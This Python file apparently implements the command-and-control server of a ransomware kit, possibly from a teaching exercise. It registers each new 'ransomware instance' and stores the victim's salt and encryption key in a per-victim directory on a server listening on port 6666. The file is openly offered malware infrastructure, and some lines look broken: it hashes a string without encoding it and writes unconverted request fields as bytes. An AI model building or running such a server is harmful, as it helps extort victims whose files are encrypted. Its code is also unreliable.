import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field
        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # Register a new ransomware instance

        # Create root directory
        os.makedirs(CNC.ROOT_PATH, exist_ok = True)

        token = body["token"]
        salt = body["salt"]
        key = body["key"]

        token_hash = sha256(token).hexdigest()
        victim_directory = os.path.join(CNC.ROOT_PATH, token_hash)
        os.makedirs(victim_directory, exist_ok = True)

        # Save the salt and key in the victim's directory
        with open(os.path.join(victim_directory, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt)
        with open(os.path.join(victim_directory, "key.bin"), "wb") as key_file:
            key_file.write(key)


httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()
